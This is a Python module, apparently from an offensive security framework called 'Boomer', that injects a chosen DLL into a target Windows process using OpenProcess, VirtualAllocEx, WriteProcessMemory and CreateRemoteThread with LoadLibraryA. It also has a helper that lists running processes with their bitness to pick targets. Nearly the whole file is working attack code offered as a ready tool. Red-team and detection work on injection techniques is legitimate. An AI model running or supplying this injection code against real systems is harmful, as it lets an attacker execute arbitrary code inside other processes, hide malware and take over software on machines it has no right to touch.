import contextlib
import ctypes.wintypes as wintypes
from ctypes import *
from os.path import isfile
from platform import architecture

from psutil import pids, Process

from module import Module


class BoomerModule(Module):
    PAGE_READWRITE = 0x04
    PROCESS_ALL_ACCESS = 0x00F0000 | 0x00100000 | 0xFFF
    COMMIT_RESERVE = 0x00001000 | 0x00002000

    def __init__(self):
        info = {
            "Name": "DLL Injection - CreateRemoteThread Method",
            "Author": "Josue Encinar",
            "Description": "Inject a DLL into a process. CreateRemoteThread Method"
        }
        options = {
            "pid": ["Target PID to inject dll", None, True],
            "dll": ["DLL to inject", None, True]
        }
        if architecture()[0] == "64bit":
            self.print_info("Process and DLL to injec must be 64 bits")
        else:
            self.print_info("Process and DLL to injec must be 32 bits")
        super(BoomerModule, self).__init__(options, info)
        self.register_single_operation("get_processes", "Return running processes with PID and architecture")

    def run(self):
        kernel32 = windll.kernel32
        pid = self.options.get("pid")[1]
        dll_to_inject = self.options.get("dll")[1]

        if not pid or not dll_to_inject:
            self.print_error("Configure the settings correctly\n    Execute show options")
            return

        dll_len = len(dll_to_inject)
        if not isfile(dll_to_inject):
            self.print_error(f"{dll_to_inject} not found...")
            return

        self.print_info(f"Obtaining handle to process with PID {pid}")
        handle_p = kernel32.OpenProcess(self.PROCESS_ALL_ACCESS, False, pid)

        if not handle_p:
            self.print_error(f"OpenProcess function didn't work... Review the PID {pid}")
            return

        self.print_info("Assigning space for DLL path")
        virtual_mem_allocate = kernel32.VirtualAllocEx(handle_p, 0, dll_len,
                                                       self.COMMIT_RESERVE, self.PAGE_READWRITE)
        if not virtual_mem_allocate:
            self.print_error("Error assigning space for DLL")
            return

        self.print_info("Writing DLL path")
        result = kernel32.WriteProcessMemory(handle_p, virtual_mem_allocate,
                                             dll_to_inject.encode("ascii"), dll_len, 0)
        if not result:
            self.print_error("Error writing")
            return

        self.print_info("Getting LoadLibraryA address")
        loadlibA_address = c_void_p.from_buffer(kernel32.LoadLibraryA).value
        if not loadlibA_address:
            self.print_error("Error getting address")
            return

        class _SECURITY_ATTRIBUTES(Structure):
            _fields_ = [('nLength', wintypes.DWORD),
                        ('lpSecurityDescriptor', wintypes.LPVOID),
                        ('bInheritHandle', wintypes.BOOL), ]

        thread_id = c_ulong(0)

        kernel32.CreateRemoteThread.argtypes = (wintypes.HANDLE, POINTER(_SECURITY_ATTRIBUTES),
                                                wintypes.DWORD, wintypes.LPVOID, wintypes.LPVOID, wintypes.DWORD,
                                                wintypes.LPDWORD)
        self.print_info("Creating Remote Thread")
        if kernel32.CreateRemoteThread(handle_p, None, 0, loadlibA_address,
                                       virtual_mem_allocate, 0, byref(thread_id)):
            self.print_ok("Remote Thread created! :)")
        else:
            self.print_error("DLL could not be injected :(")

    def get_processes(self):
        for p in pids():
            with contextlib.suppress(Exception):
                pr = Process(p)
                path = pr.exe()
                name = pr.name()
                with open(path, 'rb') as file_open:
                    read = file_open.read()
                    arch = "?? bits"
                    if b"PE\0\0L" in read:
                        arch = "32 bits"
                    elif b"PE\0\0d" in read:
                        arch = "64 bits"
                    print(f"{name}({str(p)}): {arch}")
